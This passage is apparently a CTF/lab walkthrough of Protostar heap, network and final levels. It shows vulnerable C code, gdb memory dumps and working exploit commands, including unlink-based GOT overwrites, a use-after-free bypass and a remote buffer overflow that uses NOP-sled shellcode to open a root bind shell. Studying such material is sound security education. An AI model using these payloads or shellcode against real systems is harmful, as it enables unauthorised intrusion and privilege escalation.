6. So what we have to do is pass to heap0 72 bytes of padding, and then the address of the winner method (remembering endianness):

    ```bash
    ./heap0 `python -c "print 'A' * 72 + '\x64\x84\x04\x08'"`
    ```

### [Heap 01]
Code flow hijacking in data overwrite cases.

```c
struct internet {
    int priority;
    char *name;
};

void winner(){
    printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv){
    struct internet *i1, *i2, *i3;

    i1 = malloc(sizeof(struct internet));
    i1->priority = 1;
    i1->name = malloc(8);

    i2 = malloc(sizeof(struct internet));
    i2->priority = 2;
    i2->name = malloc(8);

    strcpy(i1->name, argv[1]);
    strcpy(i2->name, argv[2]);

    printf("and that's a wrap folks!\n");
}
```

1. The overflow in this case is expected to happen when assigning the name to the internet objects: the allocated space for the names is at most 8 characters, but there are no checks in place that the length of the input actually corresponds. Also, each struct contains a name pointer that is allocated separately, meaning that we can expect the heap to be structured as follows: `[i1 struct][i1->name][i2 struct][i2->name]`
2. Playing with input we realize that we can cause a segmentation fault with too long names. So back at our nice offset-calculating service, we pass the arguments at gdb, run it and retrieve the address causing the segfault. After feeding it back to the offset service, we are nicely informed that our segfault happens at 20 bytes of input.
3. The overflowed 'i2->name' field means that we can control the destination for the second strcpy command. This means that we should redirect the return address of main on the stack with the memory address of winner, that we can retrieve with the usual objdump and corresponds to 0x08048494.
4. To find the location of the return address, we use `gdb > disassemble main`, put a breakpoint at the ret instruction, and when the breakpoint is reached look at what is the content of $esp:

    ```bash
    gdb > disas main
    gdb > b **0x08048567
    gdb > run asdf asdf
    gdb > i r $esp
    ```

5. From gdb we know that $esp contains the return address 0xbffff68c. We have to keep in mind that when not using gdb, the addresses will not correspond exactly to what we have seen using the debugger. Therefore, the return address will not be precise.
6. A workaround for this is to repeatedly write our own target address starting from a bit before what gdb told us, and continuing a bit after. With this approach, we are sure that at some point we will be writing at the right location.
7. The first argument is made by the 20 random bytes and a address lower than our known gdb-related return address, than we need a space to respect the syntax of the heap1 program, and then we have a sled of our target address. At some point the target address will be hit and we will reach the winner method.

    ```bash
    ./heap1 `python -c "print 'A' * 20 + '\x60\xf6\xff\xbf' + ' ' + '\x94\x84\x04\x08' * 8"`
    ```

### [Heap 02]
What can happen when heap pointers are stale? (This level is completed when you see the “you have logged in already!” message)

```c
struct auth {
    char name[32];
    int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv){
    char line[128];

    while(1) {
        printf("[ auth = %p, service = %p ]\n", auth, service);

        if(fgets(line, sizeof(line), stdin) == NULL) break;
        
        if(strncmp(line, "auth ", 5) == 0) {
            auth = malloc(sizeof(auth));
            memset(auth, 0, sizeof(auth));
            if(strlen(line + 5) < 31) {
                strcpy(auth->name, line + 5);
            }
        }
        if(strncmp(line, "reset", 5) == 0) {
            free(auth);
        }
        if(strncmp(line, "service", 6) == 0) {
            service = strdup(line + 7);
        }
        if(strncmp(line, "login", 5) == 0) {
            if(auth->auth) {
                printf("you have logged in already!\n");
            } else {
                printf("please enter your password\n");
            }
        }
    }
}
```

> Use after free: this vulnerability is a type of memory corruption that corresponds to trying to access memory after it has been freed. This can cause a program to crash or to execute arbitrary code in case the freed memory has already been filled with new data.

> int strncmp(const char *str1, const char *str2, size_t n): compares at most the first n bytes of str1 and str2, returning 0 if they are equal.

> char *strdup(const char *str1): returns a pointer to a null-terminated byte string, which is a duplicate of the string pointed to by str1. The pointer is to a newly allocated chunk of memory in the heap

1. This program offers different commands that can be used in a loop: auth (+ arg), reset, service (+ arg), and login. Depending on the order these commands are issued, it is possible to cause an use-after-free problem: first invoking auth, then freeing it with reset, then attempting login will result in the last command accessing auth->auth when that memory is not allocated for that use anymore.
2. Our goal is to fill the original auth struct with 1s, so that when checking auth->auth during the login, the conditional will recognize us as already logged in.
3. Based on the fact that in the heap the space is allocated sequentially, putting new chunks immediately after already allocated ones, we can run our commands so that the following happens: we call auth to allocate the memory needed for that struct; then we call reset to free it. However, the "auth" pointer still exists in the program, although it should not be used anymore. 
4. The next step is to call service and pass it a bunch of '1': service will call strdup, which allocates space in the memory just freed by releasing auth. As last, we call login: the auth pointer will be used as if the respective memory was still legitimately in use, and if we passed enough 1s with the service call, one of those 1 will be interpreted as auth->auth, allowing us to get in.

    ```bash
    ./heap2
        [ auth = (nil), service = (nil) ]
    auth AAAAAAAA
        [ auth = 0x804c008, service = (nil) ]
    reset
        [ auth = 0x804c008, service = (nil) ]
    service 11111111111111111111111111111
        [ auth = 0x804c008, service = 0x804c018 ]
    login
    you have logged in already!
        [ auth = 0x804c008, service = 0x804c018 ]
    ```

### [Heap 03]
How heap meta data can be modified to change program execution.

```c
void winner(){
    printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv){
    char *a, *b, *c;

    a = malloc(32);
    b = malloc(32);
    c = malloc(32);

    strcpy(a, argv[1]);
    strcpy(b, argv[2]);
    strcpy(c, argv[3]);

    free(c);
    free(b);
    free(a);

    printf("dynamite failed?\n");
}
```

> Malloc chunk: Let's look at the structure of a free chunk of heap memory, as interpreted in malloc instructions:
>
>   ```
>   struct malloc_chunk {
>        INTERNAL_SIZE_T     prev_size;
>        INTERNAL_SIZE_T     size;
>        struct malloc_chunk*    fd;
>        struct malloc_chunk*    bk;
>    }
>    ```
>
> The prev_size member contains the size of the chunk previous to the current chunk. It is only used if the previous chunk is free.
>        The size member contains the size of the current chunk, allocated in multiples of 8 bytes. This means that the 3 lowest bits of the size member will always be 0, and are therefore used as flag values:
>        - A (0x04): Allocated Arena - if this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap'd memory and the location of the heap can be computed from the chunk's address.
>        - M (0x02): MMap'd chunk - this chunk was allocated with a single call to mmap and is not part of a heap at all.
>        - P (0x01): Previous chunk is in use - if set, the previous chunk is still being used by the application, and thus the prev_size field is invalid. This bit really means that the previous chunk should not be considered a candidate for coalescing.
>        The fd and bk members are pointers to the next and previous chunks respectively and are only set when the chunk itself is freed and consequently added to a doubly linked free list that is used to track which chunks are currently free.

> ulink() technique: upon calling free, the previous and following chunks are tested to see if they are in use (looking at the prev_size member). Adjacent free chunks will be consolidated together as a single chunk.
> Actual ulink operations are:
> - writing the value of P->bk to the memory address pointed to by (P->fd) + 12, which corresponds to the bk member of P->fd.
> - writing the value of P->fd to the memory address pointed to by (P->bk) + 8, which corresponds to the fd member of P->bk.
> This means that controlling the values of P->bk and P->fk allows to write arbitrary data to an arbitrary location in memory. 

1. We know that a, b, and c will be allocated on the heap. Let's start gdb, but a breakpoint after the three allocation have been done and the input copied there, and take a look. To get the address, we can run info proc map and gdb will tell us where the heap starts. That's where we want to look.
    ```bash
    (gdb) x/50x 0x804c000
        0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
        0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
        0x804c030:  0x42424242  0x00000000  0x00000000  0x00000000
        0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
        0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
        0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c0c0:  0x00000000  0x00000000
    ```

2. For each variable, we see that the size member is 0x00000029. This correponds to 00101001 in binary, meaning that the size is 40 bytes and that the previous chunk is in use. We now let gdb run until the three chunks of memory are freed, and then we take a look at the heap again:

    ```bash
    (gdb) x/50x 0x804c000
        0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
        0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
        0x804c030:  0x0804c050  0x00000000  0x00000000  0x00000000
        0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
        0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
        0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
        0x804c0c0:  0x00000000  0x00000000
    ```

3. We know that the memory is free, so we would expect all prev_size, size, fd and bk to be set properly. However, only fd actually is (also size is set, but does not signal the previous chunk as free): the reason is that these chunks are so small (less than 64 bytes) that they are not merged together upon freeing, but kept separated for the sake of speed. We can change this behaviour by controlling the size field and making it large enough to move the chunks from the so-called fastbin to the normal bin.
4. However, there is a problem when trying to write the size and prev_size fields: to set them properly we need to use NULL bytes, but passing them as program arguments won't work because they will be read as string terminators and whatever else is after that will not be read at all.
5. The solution is a trick involving an integer overflow (as in this Phrack paper): passing the value 0xFFFFFFFC (-4 as a signed integer), malloc will cast it to unsigned int, meaning that -4 becomes bigger than 64. The least significant bit of 0xFFFFFFFC is not set, meaning that the previous chunk is free and the unlinking procedure will be called on it. However, the address of this previous chunk will be calculated by subtracting -4 (therefore actually adding 4) from the current chunk’s beginning (resulting in the allocator thinking that the previous chunk actually starts at 4 bytes past the start of the current chunk), and its size will also be -4.
6. We target the second argument of heap3, so that we can exploit fd and bk when it is freed. The first argument is 'AAAA' and the last 'DDDD', to be easily recognizable. The middle argument is filled with As until the allocated memory is full; then the heap smashing bytes and a recognizable pattern as data.
    ```bash
    ./heap3 `python -c "print 'AAAA ' + 'A' * 32 + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + 'AAAABBBBCCCC' + ' DDD'"`
    ```

7. Running this results in a segmentation fault as the system tries to move stuff around in adresses that do not actually exist. If we disassemble main, we see that after freeing all the allocated memory there is one last call to puts. We want to redirect this call so that instead it executes winner.
8. To get the address of winner we take a look at `objdump -t`, and see that it is located at 0x08048864. This is the address that we want to put instead of the puts entry in the GOT table, which is located at 0x0804b128 (obtained with objdump -R). The actual address that we want to overwrite is 0x0804b11c, because due to the fd-bk arithmetic we have to subtract 12 bytes from the memory address that we want to write to.
9. We can't just pass the winner address in the heap, because trying to write to it will cause a segmentation fault. Instead, we need to encode a call to it and a return. This can be done for example with an online assembler: `push 0x08048864 ; ret`
10. The encoded instructions correspond to \x68\x64\x88\x04\x08\xc3, which also nicely fits into the 8 bytes that are available. The resulting code is:
```bash
    ./heap3 `python -c "print 'AAAA\x68\x64\x88\x04\x08\xc3' + ' ' + 'A' * 32 + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + 'AAAA' + '\x1c\xb1\x04\x08\x0c\xc0\x04\x08' + ' ' + 'DDD'"`
```

I have to admit that although the techniques used are mostly clear to me, I am still a bit confused about how all of it comes together. This code works, but breaking down the single parts and pointing where they will end up in memory is quite tricky.

### [Net 00]
Converting strings to little endian integers

```c
#define NAME "net0"
#define UID 999
#define GID 999
#define PORT 2999

void run(){
    unsigned int i;
    unsigned int wanted;

    wanted = random();

    printf("Please send '%d' as a little endian 32bit int\n", wanted);

    if(fread(&i, sizeof(i), 1, stdin) == NULL) {
        errx(1, ":(\n");
    }

    if(i == wanted) {
        printf("Thank you sir/madam\n");
    } else {
        printf("I'm sorry, you sent %d instead\n", i);
    }
}

int main(int argc, char **argv, char **envp){
    int fd;
    char *username;

    /* Run the process as a daemon */
    background_process(NAME, UID, GID); 
    
    /* Wait for socket activity and return */
    fd = serve_forever(PORT);

    /* Set the client socket to STDIN, STDOUT, and STDERR */
    set_io(fd);

    /* Don't do this :> */
    srandom(time(NULL));

    run();
}
```

1. What this program does is waiting for connections on port 2999, sending out a random number to whoever connects and expecting it sent back in little endian format. After launching net0, we can test it with `nc 127.0.0.1 2999.`
2. To solve the challenge, we can implement a simple python program that connects to the deamon, reads the sent number and sends it back in little endian fashion:

    ```python
    import socket
    import re
    import struct

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2999))

    data = s.recv(1024)
    num = data.split()[2][1:-1]
    num = int(num)

    s.send(struct.pack("i", num))
    print s.recv(1024)
    s.close()
    ```
3. The data that we receive always has the same structure, so if we split it (creating a list containing the elements that were separated by spaces), we know that the number will always be the 3rd element of the list. Also, from that element we want to leave out the first and last character, that are the ticks. What is left can be easily converted to integer.
4. From the it's just a matter to use the "i" option when packing the data to be sent back.

### [Net 01]
Converting binary integers into ascii representation

```c
#define NAME "net1"
#define UID 998
#define GID 998
#define PORT 2998

void run(){
    char buf[12];
    char fub[12];
    char *q;

    unsigned int wanted;

    wanted = random();

    sprintf(fub, "%d", wanted);

    if(write(0, &wanted, sizeof(wanted)) != sizeof(wanted)) {
        errx(1, ":(\n");
    }

    if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {
        errx(1, ":(\n");
    }

    q = strchr(buf, '\r'); if(q) *q = 0;
    q = strchr(buf, '\n'); if(q) *q = 0;

    if(strcmp(fub, buf) == 0) {
        printf("you correctly sent the data\n");
    } else {
        printf("you didn't send the data properly\n");
    }
}

int main(int argc, char **argv, char **envp){
    int fd;
    char *username;

    /* Run the process as a daemon */
    background_process(NAME, UID, GID); 
    
    /* Wait for socket activity and return */
    fd = serve_forever(PORT);

    /* Set the client socket to STDIN, STDOUT, and STDERR */
    set_io(fd);

    /* Don't do this :> */
    srandom(time(NULL));

    run();
}
```
                
1. What this program does is waiting for connections on port 2998, sending out a random number in little endian format, and expecting it sent back in ASCII format. After launching net1, we can test it with `nc 127.0.0.1 2998`.
2. Also in this case we create a small python script that connects to the deamon, reads the data, manipulates it and sends it back.
    ```python
    import socket
    import re
    import struct

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2998))

    data = s.recv(1024)
    num = struct.unpack("I", data)[0]

    s.send(str(num))
    print s.recv(1024)
    s.close()
    ```
3. The script unpacks the data reading it as an integer number, and then we just send it back as string.

### [Net 02]
Adding 4 unsigned 32-bit integers (Keep in mind that it wraps)

```c
#define NAME "net2"
#define UID 997
#define GID 997
#define PORT 2997

void run(){
    unsigned int quad[4];
    int i;
    unsigned int result, wanted;

    result = 0;
    for(i = 0; i < 4; i++) {
        quad[i] = random();
        result += quad[i];

        if(write(0, &(quad[i]), sizeof(result)) != sizeof(result)) {
            errx(1, ":(\n");
        }
    }

    if(read(0, &wanted, sizeof(result)) != sizeof(result)) {
        errx(1, ":<\n");
    }


    if(result == wanted) {
        printf("you added them correctly\n");
    } else {
        printf("sorry, try again. invalid\n");
    }
}

int main(int argc, char **argv, char **envp){
    int fd;
    char *username;

    /* Run the process as a daemon */
    background_process(NAME, UID, GID); 
    
    /* Wait for socket activity and return */
    fd = serve_forever(PORT);

    /* Set the client socket to STDIN, STDOUT, and STDERR */
    set_io(fd);

    /* Don't do this :> */
    srandom(time(NULL));

    run();
}
```

1. What this program does is waiting for connections on port 2997, sending 4 numbers that should be treated as unsigned integers, and expecting back the sum of those numbers. After launching net2, we can test it with `nc 127.0.0.1 2997`.
2. Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.
    ```python
    import socket
    import re
    import struct

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2997))

    tot = 0
    for x in xrange(4):
        data = s.recv(4)
        tot += int(struct.unpack("I", data)[0])

    tot = tot & 0xffffffff

    s.send(struct.pack("I", tot))
    print s.recv(1024)
    s.close()
    ```
3. The script reads 4 times 4 bytes, corresponding to the length of usnigned int. We add the numbers to each other, and before sending the sum back we perform the '& 0xFFFFFFFF' to make clear of the possible overflows.

### [Net 03]
Implement a simple network protocol

```c
#define NAME "net3"
#define UID 996
#define GID 996
#define PORT 2996

/*
    * Extract a null terminated string from the buffer 
    */

int get_string(char **result, unsigned char *buffer, u_int16_t len){
    unsigned char byte;

    byte = *buffer;

    if(byte > len) errx(1, "badly formed packet");
    *result = malloc(byte);
    strcpy(*result, buffer + 1);

    return byte + 1;
}

/*
    * Check to see if we can log into the host
    */

int login(unsigned char *buffer, u_int16_t len){
    char *resource, *username, *password;
    int deduct;
    int success;

    if(len < 3) errx(1, "invalid login packet length");

    resource = username = password = NULL;

    deduct = get_string(&resource, buffer, len);
    deduct += get_string(&username, buffer+deduct, len-deduct);
    deduct += get_string(&password, buffer+deduct, len-deduct);

    success = 0;
    success |= strcmp(resource, "net3");
    success |= strcmp(username, "awesomesauce");
    success |= strcmp(password, "password");

    free(resource);
    free(username);
    free(password);

    return ! success;
}

void send_string(int fd, unsigned char byte, char *string){
    struct iovec v[3];
    u_int16_t len;
    int expected;

    len = ntohs(1 + strlen(string));

    v[0].iov_base = &len;
    v[0].iov_len = sizeof(len);
    
    v[1].iov_base = &byte;
    v [1].iov_len = 1;

    v[2].iov_base = string;
    v[2].iov_len = strlen(string);

    expected = sizeof(len) + 1 + strlen(string);

    if(writev(fd, v, 3) != expected) errx(1, "failed to write correct amount of bytes");
}

void run(int fd){
    u_int16_t len;
    unsigned char *buffer;
    int loggedin;

    while(1) {
        nread(fd, &len, sizeof(len));
        len = ntohs(len);
        buffer = malloc(len);

        if(! buffer) errx(1, "malloc failure for %d bytes", len);

        nread(fd, buffer, len);

        switch(buffer[0]) {
            case 23:
                loggedin = login(buffer + 1, len - 1);
                send_string(fd, 33, loggedin ? "successful" : "failed");
                break;
            
            default:
                send_string(fd, 58, "what you talkin about willis?");
                break;
        }
    }
}

int main(int argc, char **argv, char **envp){
    int fd;
    char *username;

    /* Run the process as a daemon */
    background_process(NAME, UID, GID); 
    
    /* Wait for socket activity and return */
    fd = serve_forever(PORT);

    /* Set the client socket to STDIN, STDOUT, and STDERR */
    set_io(fd);

    /* Don't do this :> */
    srandom(time(NULL));

    run(fd);
}
```

1. What this program does is waiting for connections on port 2996 and checking the login creentials. After launching net3, we can test it with `nc 127.0.0.1 2996`.
2. The credentials have to be sent in a specific format: first send the total byte length of the login string, then in a second send push the string itself. This string has to contain the service, username and password, each prepended with its own size and appended with a NULL byte.
3. Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.

    ```python
    import socket
    import re
    import struct

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2996))

    login_string = "\x17"
    login_string += "\x05net3\x00"
    login_string += "\x0dawesomesauce\x00"
    login_string += "\x0apassword\x00"

    login_length = len(login_string)

    s.send(struct.pack(">H", login_length))
    s.send(login_string)
    print s.recv(1024)
    s.close()
    ```

4. The script creates the login string: first of all the "secret" byte to access the login functionality, then the name of the service, then the username and at the end the password. The length of this string is sent as unsigned short (as defined in the C code), then the string itself is sent out. The terminating NULL is required by the strcpy method.

### [Final 00]
Combine a stack overflow and network programming for a remote overflow.

```c
#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
    * Read the username in from the network
    */

char *get_username(){
    char buffer[512];
    char *q;
    int i;

    memset(buffer, 0, sizeof(buffer));
    gets(buffer);

    /* Strip off trailing new line characters */
    q = strchr(buffer, '\n');
    if(q) *q = 0;
    q = strchr(buffer, '\r');
    if(q) *q = 0;

    /* Convert to lower case */
    for(i = 0; i < strlen(buffer); i++) {
        buffer[i] = toupper(buffer[i]);
    }

    /* Duplicate the string and return it */
    return strdup(buffer);
}

int main(int argc, char **argv, char **envp){
    int fd;
    char *username;

    /* Run the process as a daemon */
    background_process(NAME, UID, GID); 
    
    /* Wait for socket activity and return */
    fd = serve_forever(PORT);

    /* Set the client socket to STDIN, STDOUT, and STDERR */
    set_io(fd);

    username = get_username();
    
    printf("No such user %s\n", username);
}
```

> nopsled: a NOP sled is a sequence of NOP (no-operation) instructions that are usually inserted as a landing zone for a jump that doesn't have a precise target address. A nopsled gives a larger landing space, easier to guess than a single address, and will make the execution flow down to the actual starting point without secondary effects.

1. Upon connection, the service expects a username to be checked for existence. It is clear from the code that there is no actual check in place, therefore the goal of this challenge is to spawn a shell thanks to a buffer overflow in the username that we pass.
2. The first thing to do is to check how many characters we need to pass to overwrite the $eip after the buffer. We can't do it automatically with the service we used until now because the toUpper function will mix up the results, so we will do it manually:

    ```python
    import socket
    import struct

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2995))

    offset = 'a' * 512 + 'b' * 4 + c * 4 + 'd' * 4

    s.send(offset)
    ```

3. After executing the python script we switch to a root account with `su root` and password `godmode` to check if we managed to cause a segmentation fault. If yes, the core dump file is saved in /tmp and we can look at it with `gdb --core /tmp/core_xxx`. In this case we will see with what $eip crashed, and can adjust the length of our offset payload.
4. If no segfault happened, we have to try again with a longer payload. The goal is to find the perfect offset to be able to put an address in $eip, and this number is 532.
5. The shellcode that we want to use has to be resistent to the `toUpper` method. A working example can be taken from Exploit DB. Upon execution, we will be able to netcat to port 5074 and we should get a root shell.
6. We can now start to build the payload, knowing that we will need a return address that points at the start of the buffer but remembering that we don't know the exact starting address of the buffer itself. To solve this problem, we start the payload with a nopsled, so that we can aim at the buffer without having to worry about guessing the precise address. After the sled we place the shellcode, than we pad with whatever until we reach the $eip, and there we put a mock address.

    ```python
    import socket
    import struct

    s = socket.socket(AF_INET, SOCK_STREAM)
    s.connect(("127.0.0.1", 2995))

    nop = "\x90"*24

    shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff" \
    "\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47" \
    "\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed" \
    "DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB" \
    "AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA" \
    "JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO" \
    "BLAALMNIA"

    padding = "a"*(532-len(nop)-len(shellcode))

    ret = "\xaa\xaa\xaa\xaa"

    s.send(nop + shellcode + padding + ret)
    ```

7. Running this script causes another segmentation fault, because our return address is obviously non-existing. So what we have to do is to find out a return address that makes sense. We start gdb again with the core dump, and we look at the registers, with `i r`. What we are interested in is the $esp register, that tells us where the stack ends.
8. Now it's a matter of patience while looking at the stack content until we find our nopsled: we go through the memory with `gdb > x/100x $esp-x`, where we increase x until we find the bunc of '90' that correspond to the nop instructions.
9. We pick an address that points somewhere in the middle of the sled, in this way we can be sure that no matter what little shifts the stack will go through during execution we will still land in the proper place and peacefully slide down to the shellcode. We can pick 0xbffffa50, substitute it as the return address in our last script and run it again.
10. Our code executed nicely, and returned. We can now run netcat and check if we got actual root shell by issuing the whoami command: `nc 127.0.0.1 5074`

I find it a bit odd that to see if this exploit works we need to login with the godmode account. Makes me wonder if there is another approach, or if the whole attack should be carried out blindly.

### [Final 01]
### [Final 02]
------








